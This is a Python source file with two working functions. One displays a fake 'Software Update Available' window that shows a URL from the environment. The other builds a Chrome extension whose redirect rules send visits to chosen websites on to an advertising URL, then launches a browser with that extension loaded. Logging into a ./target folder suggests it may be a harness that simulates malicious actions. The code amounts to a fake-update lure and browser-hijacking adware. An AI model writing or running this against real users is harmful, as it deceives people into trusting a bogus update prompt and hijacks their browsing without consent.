def display_fake_update_prompt():
    try:
        import json
        import os
        import subprocess
        import sys
        from pathlib import Path

        target = Path("./target")
        target.mkdir(parents=True, exist_ok=True)
        outcome = target / "update_prompt_outcome.json"
        url = os.environ.get("UPDATE_URL", "").strip()

        if not url:
            outcome.write_text(
                json.dumps({"displayed": False, "reason": "UPDATE_URL is not set"}, indent=2),
                encoding="utf-8",
            )
            return

        script = """
import sys
import tkinter as tk

root = tk.Tk()
root.title("Software Update Available")
root.geometry("440x170")
root.resizable(False, False)

tk.Label(root, text="A software update is available.", font=("Arial", 14)).pack(pady=(20, 8))
tk.Label(root, text="Update URL: " + sys.argv[1], wraplength=400).pack(pady=5)
tk.Button(root, text="Dismiss", command=root.destroy).pack(pady=15)

root.after(8000, root.destroy)
root.mainloop()
"""
        try:
            result = subprocess.run(
                [sys.executable, "-c", script, url],
                capture_output=True,
                text=True,
                timeout=12,
                check=False,
            )
            record = {
                "displayed": result.returncode == 0,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "update_url": url,
            }
        except Exception as exc:
            record = {
                "displayed": False,
                "error": str(exc),
                "update_url": url,
            }

        outcome.write_text(json.dumps(record, indent=2), encoding="utf-8")
    except Exception:
        pass


def redirect_website_visits():
    import json
    import os
    import re
    import shutil
    import subprocess
    from pathlib import Path
    from urllib.parse import urlsplit

    target = Path("./target")
    outcome = {"status": "not_started"}

    try:
        target.mkdir(parents=True, exist_ok=True)

        # Set AD_URL and REDIRECT_SITES in the environment, or provide
        # ./target/redirect_config.json with "ad_url" and "sites" fields.
        config_path = target / "redirect_config.json"
        config = json.loads(config_path.read_text(encoding="utf-8")) if config_path.exists() else {}
        ad_url = os.environ.get("AD_URL") or config.get("ad_url", "")
        sites = os.environ.get("REDIRECT_SITES")
        sites = sites.split(",") if sites is not None else config.get("sites", [])

        destination = urlsplit(ad_url)
        if destination.scheme not in ("http", "https") or not destination.hostname:
            raise ValueError("AD_URL must be an absolute HTTP or HTTPS URL")
        if isinstance(sites, str):
            sites = [sites]

        hosts = []
        for site in sites:
            site = str(site).strip()
            parsed = urlsplit(site if "://" in site else "//" + site)
            host = parsed.hostname
            if not host or not re.fullmatch(r"[A-Za-z0-9.-]+", host):
                raise ValueError("Each site must contain a valid hostname")
            hosts.append(host.lower())

        hosts = list(dict.fromkeys(hosts))
        if not hosts:
            raise ValueError("No sites configured")

        extension = target / "redirect_extension"
        extension.mkdir(parents=True, exist_ok=True)
        rules = [
            {
                "id": index,
                "priority": 1,
                "action": {"type": "redirect", "redirect": {"url": ad_url}},
                "condition": {
                    "regexFilter": (
                        r"^https?://" + re.escape(host) + r"(?::[0-9]+)?(?:[/?#]|$)"
                    ),
                    "resourceTypes": ["main_frame"],
                },
            }
            for index, host in enumerate(hosts, 1)
        ]
        manifest = {
            "manifest_version": 3,
            "name": "Configured Website Redirects",
            "version": "1.0.0",
            "permissions": ["declarativeNetRequest"],
            "host_permissions": [
                pattern
                for host in hosts
                for pattern in (f"http://{host}/*", f"https://{host}/*")
            ],
            "declarative_net_request": {
                "rule_resources": [
                    {"id": "redirects", "enabled": True, "path": "rules.json"}
                ]
            },
        }
        (extension / "manifest.json").write_text(
            json.dumps(manifest, indent=2), encoding="utf-8"
        )
        (extension / "rules.json").write_text(
            json.dumps(rules, indent=2), encoding="utf-8"
        )

        browser = next(
            (
                path
                for name in ("chromium", "chromium-browser", "google-chrome", "chrome", "msedge")
                if (path := shutil.which(name))
            ),
            None,
        )
        if browser is None:
            outcome = {
                "status": "extension_created_browser_not_found",
                "sites": hosts,
                "extension": str(extension.resolve()),
            }
        else:
            command = [
                browser,
                f"--user-data-dir={target.resolve() / 'browser_profile'}",
                f"--disable-extensions-except={extension.resolve()}",
                f"--load-extension={extension.resolve()}",
                "--no-first-run",
                "about:blank",
            ]
            with (target / "browser_stdout.log").open("ab") as stdout, (
                target / "browser_stderr.log"
            ).open("ab") as stderr:
                process = subprocess.Popen(
                    command,
                    stdin=subprocess.DEVNULL,
                    stdout=stdout,
                    stderr=stderr,
                    start_new_session=True,
                )
            outcome = {
                "status": "browser_launch_attempted",
                "command": command,
                "pid": process.pid,
                "immediate_exit_code": process.poll(),
                "sites": hosts,
                "ad_url": ad_url,
            }
    except Exception as exc:
        outcome = {"status": "error", "error": f"{type(exc).__name__}: {exc}"}
    finally:
        try:
            target.mkdir(parents=True, exist_ok=True)
            (target / "redirect_outcome.json").write_text(
                json.dumps(outcome, indent=2), encoding="utf-8"
            )
        except Exception:
            pass

